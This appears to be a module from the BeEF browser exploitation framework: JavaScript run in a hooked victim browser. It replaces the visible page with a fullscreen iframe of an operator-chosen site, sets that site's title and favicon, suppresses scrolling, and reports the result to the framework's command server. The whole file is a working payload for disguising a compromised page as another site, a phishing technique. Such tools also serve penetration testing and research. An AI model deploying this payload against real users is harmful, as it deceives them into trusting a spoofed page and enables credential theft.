//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = 'Iframe successfully created!';
	var title = '<%= @iframe_title %>';
	var iframe_src = '<%= @iframe_src %>';
	var iframe_favicon = '<%= @iframe_favicon %>';
	var sent = false;

	$j("iframe").remove();
	
	beef.dom.createIframe('fullscreen', 'get', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });
	document.body.scroll = "no";
	document.documentElement.style.overflow = 'hidden';
	beef.browser.changeFavicon(iframe_favicon);

	setTimeout(function() { 
		if(!sent) {
			result = 'Iframe failed to load, timeout';
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
			document.title = iframe_src + " is not available";
			sent = true;
		}
	}, <%= @iframe_timeout %>);

});
